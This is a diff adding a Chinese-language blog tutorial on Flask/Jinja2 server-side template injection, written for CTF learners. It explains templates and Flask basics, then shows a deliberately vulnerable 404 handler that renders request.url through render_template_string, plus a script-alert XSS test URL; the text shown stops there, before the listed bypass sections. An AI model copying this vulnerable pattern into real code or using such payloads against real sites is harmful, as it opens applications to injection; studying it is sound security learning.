@@ -1,0 +1,760 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="这是我在先知社区的第一篇的文章,希望能对各位师傅有所帮助. Falsk ssti">
+<meta property="og:type" content="article">
+<meta property="og:title" content="FLASK SSTI">
+<meta property="og:url" content="http://n0el4kls.github.io/2021/10/26/2021-10-26-flaskssti/index.html">
+<meta property="og:site_name" content="Noel&#39;s Blog">
+<meta property="og:description" content="这是我在先知社区的第一篇的文章,希望能对各位师傅有所帮助. Falsk ssti">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://particles.oss-cn-beijing.aliyuncs.com/img/banner.jpg">
+<meta property="og:image" content="https://particles.oss-cn-beijing.aliyuncs.com/img/image-20210831161733055.png">
+<meta property="og:image" content="https://particles.oss-cn-beijing.aliyuncs.com/img/image-20210831161850794.png">
+<meta property="og:image" content="https://particles.oss-cn-beijing.aliyuncs.com/img/image-20210831180055212.png">
+<meta property="og:image" content="https://particles.oss-cn-beijing.aliyuncs.com/img/image-20210831180652308.png">
+<meta property="og:image" content="https://particles.oss-cn-beijing.aliyuncs.com/img/image-20210831180919952.png">
+<meta property="og:image" content="https://particles.oss-cn-beijing.aliyuncs.com/img/image-20210831184102838.png">
+<meta property="og:image" content="https://particles.oss-cn-beijing.aliyuncs.com/img/image-20210831183648864.png">
+<meta property="og:image" content="https://particles.oss-cn-beijing.aliyuncs.com/img/image-20210831183726235.png">
+<meta property="og:image" content="https://particles.oss-cn-beijing.aliyuncs.com/img/image-20210902205905654.png">
+<meta property="og:image" content="https://particles.oss-cn-beijing.aliyuncs.com/img/image-20210924165507076.png">
+<meta property="og:image" content="https://particles.oss-cn-beijing.aliyuncs.com/img/image-20210924170058683.png">
+<meta property="og:image" content="https://particles.oss-cn-beijing.aliyuncs.com/img/image-20210924170154061.png">
+<meta property="og:image" content="https://particles.oss-cn-beijing.aliyuncs.com/img/image-20210924170402024.png">
+<meta property="og:image" content="https://particles.oss-cn-beijing.aliyuncs.com/img/image-20210924172705770.png">
+<meta property="og:image" content="https://particles.oss-cn-beijing.aliyuncs.com/img/image-20210924173036642.png">
+<meta property="og:image" content="https://particles.oss-cn-beijing.aliyuncs.com/img/image-20210924173220905.png">
+<meta property="og:image" content="https://particles.oss-cn-beijing.aliyuncs.com/img/image-20210924173714196.png">
+<meta property="og:image" content="https://particles.oss-cn-beijing.aliyuncs.com/img/image-20210924183512163.png">
+<meta property="og:image" content="https://particles.oss-cn-beijing.aliyuncs.com/img/image-20210924183400807.png">
+<meta property="og:image" content="https://particles.oss-cn-beijing.aliyuncs.com/img/image-20210924190038637.png">
+<meta property="og:image" content="https://particles.oss-cn-beijing.aliyuncs.com/img/image-20210924193657572.png">
+<meta property="og:image" content="https://particles.oss-cn-beijing.aliyuncs.com/img/image-20210927112712493.png">
+<meta property="og:image" content="https://particles.oss-cn-beijing.aliyuncs.com/img/image-20210924190118628.png">
+<meta property="og:image" content="https://particles.oss-cn-beijing.aliyuncs.com/img/image-20210927112343806.png">
+<meta property="og:image" content="https://particles.oss-cn-beijing.aliyuncs.com/img/image-20210924190126091.png">
+<meta property="og:image" content="https://particles.oss-cn-beijing.aliyuncs.com/img/image-20210927155336932.png">
+<meta property="og:image" content="https://particles.oss-cn-beijing.aliyuncs.com/img/image-20210924190136543.png">
+<meta property="og:image" content="https://particles.oss-cn-beijing.aliyuncs.com/img/image-20210927131713503.png">
+<meta property="og:image" content="https://particles.oss-cn-beijing.aliyuncs.com/img/image-20210925232814991.png">
+<meta property="og:image" content="https://particles.oss-cn-beijing.aliyuncs.com/img/image-20210925234522328.png">
+<meta property="og:image" content="https://particles.oss-cn-beijing.aliyuncs.com/img/image-20210926103636017.png">
+<meta property="og:image" content="https://particles.oss-cn-beijing.aliyuncs.com/img/image-20210926104739695.png">
+<meta property="og:image" content="https://particles.oss-cn-beijing.aliyuncs.com/img/image-20210926111523826.png">
+<meta property="og:image" content="https://particles.oss-cn-beijing.aliyuncs.com/img/image-20210926111709414.png">
+<meta property="og:image" content="https://particles.oss-cn-beijing.aliyuncs.com/img/image-20210926112300549.png">
+<meta property="og:image" content="https://particles.oss-cn-beijing.aliyuncs.com/img/image-20210926130328927.png">
+<meta property="og:image" content="https://particles.oss-cn-beijing.aliyuncs.com/img/image-20210926143626497.png">
+<meta property="og:image" content="https://particles.oss-cn-beijing.aliyuncs.com/img/image-20210926143646554.png">
+<meta property="og:image" content="https://particles.oss-cn-beijing.aliyuncs.com/img/image-20210926150339261.png">
+<meta property="og:image" content="https://particles.oss-cn-beijing.aliyuncs.com/img/image-20210926150534193.png">
+<meta property="og:image" content="https://particles.oss-cn-beijing.aliyuncs.com/img/image-20210926143655782.png">
+<meta property="og:image" content="https://particles.oss-cn-beijing.aliyuncs.com/img/image-20210926143712383.png">
+<meta property="og:image" content="https://particles.oss-cn-beijing.aliyuncs.com/img/image-20210926170311552.png">
+<meta property="og:image" content="https://particles.oss-cn-beijing.aliyuncs.com/img/image-20210927143907669.png">
+<meta property="og:image" content="https://particles.oss-cn-beijing.aliyuncs.com/img/image-20210927144342078.png">
+<meta property="og:image" content="https://particles.oss-cn-beijing.aliyuncs.com/img/image-20210927144420692.png">
+<meta property="og:image" content="https://particles.oss-cn-beijing.aliyuncs.com/img/image-20210927144625707.png">
+<meta property="og:image" content="https://particles.oss-cn-beijing.aliyuncs.com/img/image-20210927125630695.png">
+<meta property="og:image" content="https://particles.oss-cn-beijing.aliyuncs.com/img/image-20210927145707004.png">
+<meta property="og:image" content="https://particles.oss-cn-beijing.aliyuncs.com/img/image-20210927125427004.png">
+<meta property="og:image" content="https://particles.oss-cn-beijing.aliyuncs.com/img/image-20210926143742060.png">
+<meta property="og:image" content="https://particles.oss-cn-beijing.aliyuncs.com/img/image-20210927111652753.png">
+<meta property="article:published_time" content="2021-10-26T06:38:36.000Z">
+<meta property="article:modified_time" content="2022-08-02T11:52:35.936Z">
+<meta property="article:author" content="Noel">
+<meta property="article:tag" content="Python">
+<meta property="article:tag" content="SSTI">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://particles.oss-cn-beijing.aliyuncs.com/img/banner.jpg">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>FLASK SSTI</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.1.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/categories/">categories</a></li><!--
+     --><!--
+       --><li><a href="/tags/">tags</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/N0el4kLs">مشاريع</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2021/11/15/2021-11-15-beescms%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2021/08/15/NodejsSummary/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://n0el4kls.github.io/2021/10/26/2021-10-26-flaskssti/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://n0el4kls.github.io/2021/10/26/2021-10-26-flaskssti/&text=FLASK SSTI"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://n0el4kls.github.io/2021/10/26/2021-10-26-flaskssti/&title=FLASK SSTI"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://n0el4kls.github.io/2021/10/26/2021-10-26-flaskssti/&is_video=false&description=FLASK SSTI"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=FLASK SSTI&body=Check out this article: http://n0el4kls.github.io/2021/10/26/2021-10-26-flaskssti/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://n0el4kls.github.io/2021/10/26/2021-10-26-flaskssti/&title=FLASK SSTI"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://n0el4kls.github.io/2021/10/26/2021-10-26-flaskssti/&title=FLASK SSTI"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://n0el4kls.github.io/2021/10/26/2021-10-26-flaskssti/&title=FLASK SSTI"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://n0el4kls.github.io/2021/10/26/2021-10-26-flaskssti/&title=FLASK SSTI"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://n0el4kls.github.io/2021/10/26/2021-10-26-flaskssti/&name=FLASK SSTI&description=&lt;p&gt;这是我在先知社区的第一篇的文章,希望能对各位师傅有所帮助.&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://xz.aliyun.com/t/10394&#34;&gt;Falsk ssti&lt;/a&gt;&lt;/p&gt;"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://n0el4kls.github.io/2021/10/26/2021-10-26-flaskssti/&t=FLASK SSTI"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#SSTI-%E4%BB%8B%E7%BB%8D"><span class="toc-number">1.</span> <span class="toc-text">SSTI 介绍</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF%E6%A8%A1%E6%9D%BF%E4%BB%A5%E5%8F%8A%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E"><span class="toc-number">2.</span> <span class="toc-text">什么是模板以及模板引擎</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Flask%E5%9F%BA%E7%A1%80"><span class="toc-number">3.</span> <span class="toc-text">Flask基础</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A8%A1%E6%9D%BF%E6%B8%B2%E6%9F%93"><span class="toc-number">4.</span> <span class="toc-text">模板渲染</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Flask-SSTI"><span class="toc-number">5.</span> <span class="toc-text">Flask SSTI</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E4%BA%A7%E7%94%9F-SSTI"><span class="toc-number">6.</span> <span class="toc-text">为什么产生 SSTI</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SSTI%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">7.</span> <span class="toc-text">SSTI漏洞利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%AD%94%E6%B3%95%E6%96%B9%E6%B3%95%E5%92%8C%E5%86%85%E7%BD%AE%E5%B1%9E%E6%80%A7"><span class="toc-number">8.</span> <span class="toc-text">魔法方法和内置属性</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#builtins"><span class="toc-number">8.0.1.</span> <span class="toc-text">__builtins__</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#sys"><span class="toc-number">8.0.2.</span> <span class="toc-text">sys</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#import"><span class="toc-number">8.0.3.</span> <span class="toc-text">__import__</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%83%E4%B9%A0"><span class="toc-number">9.</span> <span class="toc-text">练习</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Level-1-no-waf"><span class="toc-number">9.1.</span> <span class="toc-text">Level  1 no waf</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8B%93%E5%B1%95"><span class="toc-number">9.2.</span> <span class="toc-text">拓展</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Level-2-bypass"><span class="toc-number">9.3.</span> <span class="toc-text">Level 2 bypass {{</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8B%93%E5%B1%95-1"><span class="toc-number">9.3.1.</span> <span class="toc-text">拓展</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Level-3"><span class="toc-number">9.4.</span> <span class="toc-text">Level 3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Level-4-bypass"><span class="toc-number">9.5.</span> <span class="toc-text">Level 4 bypass [  ]</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Level-5-bypass-%E2%80%98-%E2%80%9C"><span class="toc-number">9.6.</span> <span class="toc-text">Level 5 bypass  ‘   “</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8B%93%E5%B1%95-2"><span class="toc-number">9.6.1.</span> <span class="toc-text">拓展</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Level-6-bypass"><span class="toc-number">9.7.</span> <span class="toc-text">Level 6 bypass _</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%B3%E4%BA%8E%E8%BF%87%E6%BB%A4%E5%99%A8"><span class="toc-number">9.7.1.</span> <span class="toc-text">关于过滤器</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8B%93%E5%B1%95-3"><span class="toc-number">9.7.2.</span> <span class="toc-text">拓展</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Level-7-bypass"><span class="toc-number">9.8.</span> <span class="toc-text">Level 7 bypass .</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Level-8-bypass-keywords"><span class="toc-number">9.9.</span> <span class="toc-text">Level 8 bypass keywords</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8B%93%E5%B1%95-4"><span class="toc-number">9.9.1.</span> <span class="toc-text">拓展</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Level-9-bypass-number"><span class="toc-number">9.10.</span> <span class="toc-text">Level 9 bypass number</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Level-10"><span class="toc-number">9.11.</span> <span class="toc-text">Level 10</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Level-11-bypass-combination1"><span class="toc-number">9.12.</span> <span class="toc-text">Level 11 bypass combination1</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E7%A9%BA%E6%A0%BC"><span class="toc-number">9.12.1.</span> <span class="toc-text">绕过空格</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Level-12-bypass-combination2"><span class="toc-number">9.13.</span> <span class="toc-text">Level 12 bypass combination2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Level-13-bypass-combination3"><span class="toc-number">9.14.</span> <span class="toc-text">Level 13 bypass combination3</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">10.</span> <span class="toc-text">总结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">11.</span> <span class="toc-text">参考</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        FLASK SSTI
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Noel</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2021-10-26T06:38:36.000Z" itemprop="datePublished">2021-10-26</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/CTF/">CTF</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/Python/" rel="tag">Python</a>, <a class="tag-link-link" href="/tags/SSTI/" rel="tag">SSTI</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <p>这是我在先知社区的第一篇的文章,希望能对各位师傅有所帮助.</p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/10394">Falsk ssti</a></p>
+<span id="more"></span>
+
+<p><img src="https://particles.oss-cn-beijing.aliyuncs.com/img/banner.jpg" alt="banner"></p>
+<h2 id="SSTI-介绍"><a href="#SSTI-介绍" class="headerlink" title="SSTI 介绍"></a>SSTI 介绍</h2><p>SSTI 全称（Server-Side Template Injection),中文名服务端模板注入.</p>
+<p>在介绍模板注入之前,首先得知道什么是模板.</p>
+<h2 id="什么是模板以及模板引擎"><a href="#什么是模板以及模板引擎" class="headerlink" title="什么是模板以及模板引擎"></a>什么是模板以及模板引擎</h2><p>用通俗的话解释,模板就是一段话中存在可动态替换的部分.假设存在以下代码</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;hello<span class="subst">&#123;username&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>由于这句代码能够因为不同的 <code>username</code>而显示不同的结果,因此我们可以简单的把这段话理解为一个模板.(当然这个例子不是很恰当)</p>
+<p>而模板引擎的作用是为了使用户界面(例如上面的<code>hello+用户名</code>)与业务数据或内容(例如上面的username)生成特定的文档(如你所看到的HTML).</p>
+<blockquote>
+<p>通俗点讲:拿到数据,塞到模板里,然后让渲染引擎将塞进去的东西生成 html 的文本,最后返回给浏览器.</p>
+</blockquote>
+<p>采用模板以及模板引擎的好处可以让程序(网站)实现界面与数据分离,业务代码与逻辑代码的分离,这大大提升了开发效率,也使得代码重用变得更加容易.</p>
+<p>但是由于渲染的数据是业务数据,且大多数都由用户提供,这就意味着用户对输入可控.如果后端没有对用户的输入进行检测和判断,那么就容易产生代码和数据混淆,从而产生注入.</p>
+<h2 id="Flask基础"><a href="#Flask基础" class="headerlink" title="Flask基础"></a>Flask基础</h2><p>本文主要学习和记录Python中Flask SSTI.在详细分析Flask SSTI之前,得先对Flask的基础语法有些了解.</p>
+<blockquote>
+<p>Flask 是一个用python实现的微型web框架,意味着flask能为您提供了工具、库和技术,使您可以构建web应用程序.</p>
+</blockquote>
+<p>为了快速了解Flask基础,本人简单编写了一段代码<code>demo.py</code>,以此代码为例简单说明Flask语法</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello_world</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Hello World!&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure>
+
+<ol>
+<li><p>第一行,导入Flask类.用于后面实例化出一个WSGI应用程序.</p>
+</li>
+<li><p>创建Flask实例,传入的第一个参数为模块或包名.</p>
+</li>
+<li><p>使用<code>route()</code>装饰器告诉Flask怎样解析我们访问的URL.起路由作用.</p>
+</li>
+<li><p>下面跟着的函数将在访问对应路由时触发.比如此处我们访问网站根目录,将返回 <code>Hello Wrold</code>到对应页面.</p>
+</li>
+<li><p><code>app.run()</code>函数让应用在本地启动</p>
+</li>
+</ol>
+<p>运行此<code>.py</code>文件</p>
+<p><img src="https://particles.oss-cn-beijing.aliyuncs.com/img/image-20210831161733055.png" alt="image-20210831161733055"></p>
+<p>并访问<code>http://127.0.0.1:5000</code>你将看到</p>
+<p><img src="https://particles.oss-cn-beijing.aliyuncs.com/img/image-20210831161850794.png" alt="image-20210831161850794"></p>
+<p>Flask官网也提供了一篇快速入门的章节,可<a target="_blank" rel="noopener" href="http://docs.jinkan.org/docs/flask/quickstart.html">点击此处</a>前往阅读</p>
+<h2 id="模板渲染"><a href="#模板渲染" class="headerlink" title="模板渲染"></a>模板渲染</h2><p>Flask 使用了Jinja2 引擎来对模板进行渲染.</p>
+<p>再给出渲染模板示例代码之前,咱们先创建个模板,命名为<code>demo_tmp.html</code>,内容如下:</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Welcome to Flask<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Hello, &#123;&#123;name&#125;&#125;!<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>{% raw %}<br>其中, <code>{{ }}</code> 内是需要渲染的内容.<br>{% endraw %}</p>
+<blockquote>
+<p>jinja2模板中使用 {{ }} 语法表示一个变量,它是一种特殊的占位符.当利用jinja2进行渲染的时候,它会把这些特殊的占位符进行填充&#x2F;替换,jinja2支持python中所有的Python数据类型比如列表、字段、对象等.</p>
+</blockquote>
+<p>由于Flask 会在 templates 文件夹里寻找模板,所以需要在<code>demo.py</code>的同级目录下创建一个<code>templates</code>目录,并将<code>demo_tmp.html</code>放入.</p>
+<p><img src="https://particles.oss-cn-beijing.aliyuncs.com/img/image-20210831180055212.png" alt="image-20210831180055212"></p>
+<p>稍微修改以下<code>demo.py</code></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> render_template</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>]</span></span></span><br><span class="line"><span class="params"><span class="meta"><span class="keyword">def</span> hello_world(<span class="params"></span>):</span></span></span><br><span class="line"><span class="params"><span class="meta">    query = request.args.get(<span class="params"><span class="string">&#x27;name&#x27;</span></span>) <span class="comment"># 获取get方法传递的 name的值</span></span></span></span><br><span class="line"><span class="params"><span class="meta">    <span class="keyword">return</span> render_template(<span class="params"><span class="string">&#x27;demo_tmp.html&#x27;</span>, name=query</span>) <span class="comment"># 将get接收到的name的值传入模板,进行渲染</span></span></span></span><br><span class="line"><span class="params"><span class="meta"></span></span></span><br><span class="line"><span class="params"><span class="meta"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span></span></span><br><span class="line"><span class="params"><span class="meta">    app.run(<span class="params">debug=<span class="literal">True</span></span>)  <span class="comment"># 开启 debug模式,每次修改代码后就不需要手动重启服务器,服务器会在代码修改后自动重新载入</span></span></span></span><br></pre></td></tr></table></figure>
+
+<p>运行并访问<code>http://127.0.0.1:5000/?name=Noel</code>,可以看到结果如下结果</p>
+<p><img src="https://particles.oss-cn-beijing.aliyuncs.com/img/image-20210831180652308.png" alt="image-20210831180652308"></p>
+<p>页面显示会随着传递给name参数的改变而改变.</p>
+<p><img src="https://particles.oss-cn-beijing.aliyuncs.com/img/image-20210831180919952.png" alt="image-20210831180919952"></p>
+<p><img src="https://particles.oss-cn-beijing.aliyuncs.com/img/image-20210831184102838.png" alt="image-20210831184102838"></p>
+<p>那注入问题有又是怎么产生的呢?</p>
+<h2 id="Flask-SSTI"><a href="#Flask-SSTI" class="headerlink" title="Flask SSTI"></a>Flask SSTI</h2><p>这里我先给出一段拥有ssti注入漏洞的flask代码:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.errorhandler(<span class="params"><span class="number">404</span></span>) </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">page_not_found</span>(<span class="params">e</span>): </span><br><span class="line">    template = <span class="string">&#x27;&#x27;&#x27;&#123;%% extends &quot;layout.html&quot; %%&#125; </span></span><br><span class="line"><span class="string">    &#123;%% block body %%&#125; </span></span><br><span class="line"><span class="string">    &lt;div class=&quot;center-content error&quot;&gt; </span></span><br><span class="line"><span class="string">        &lt;h1&gt;Opps! That page doesn&#x27;t exist.&lt;/h1&gt; </span></span><br><span class="line"><span class="string">        &lt;h3&gt;%s&lt;/h3&gt; </span></span><br><span class="line"><span class="string">    &lt;/div&gt; </span></span><br><span class="line"><span class="string">    &#123;%% endblock %%&#125; </span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span> % (request.url) </span><br><span class="line">    <span class="keyword">return</span> render_template_string(template), <span class="number">404</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p> 代码来源于:<a target="_blank" rel="noopener" href="https://blog.nvisium.com/p263">https://blog.nvisium.com/p263</a></p>
+</blockquote>
+<p>这段代码的逻辑为:当访问不存在的路由时或错误请求导致404时,将 URL 格式化为字符串并将其展示给用户.假设我们传入的url为<code>http://127.0.0.1:5000/&lt;script&gt;alert(1)&lt;/script&gt;</code>,访问,触发弹窗.</p>
+<p><img src="https://particles.oss-cn-beijing.aliyuncs.com/img/image-20210831183648864.png" alt="image-20210831183648864"></p>
